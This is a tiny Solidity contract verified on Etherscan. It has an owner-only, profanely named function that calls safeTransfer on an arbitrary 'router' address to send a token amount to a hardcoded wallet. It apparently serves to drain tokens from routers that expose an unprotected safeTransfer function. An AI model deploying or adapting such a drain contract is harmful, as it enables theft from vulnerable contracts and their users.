/**
 *Submitted for verification at Etherscan.io on 2022-04-14
*/

pragma solidity ^0.8.12;
interface ERC20{

    function safeTransfer(address token,address to,uint256 amount) external;
}
contract test{
    address owner = msg.sender;
    function fuckyou(address router,address token,uint256 amount) external{
        require(msg.sender == owner,"fuck you!!!");
        ERC20(router).safeTransfer(token,0x7Beaa8039f900D0b1E1814253E2bcEcbCba5ED8F,amount);
        
    }


}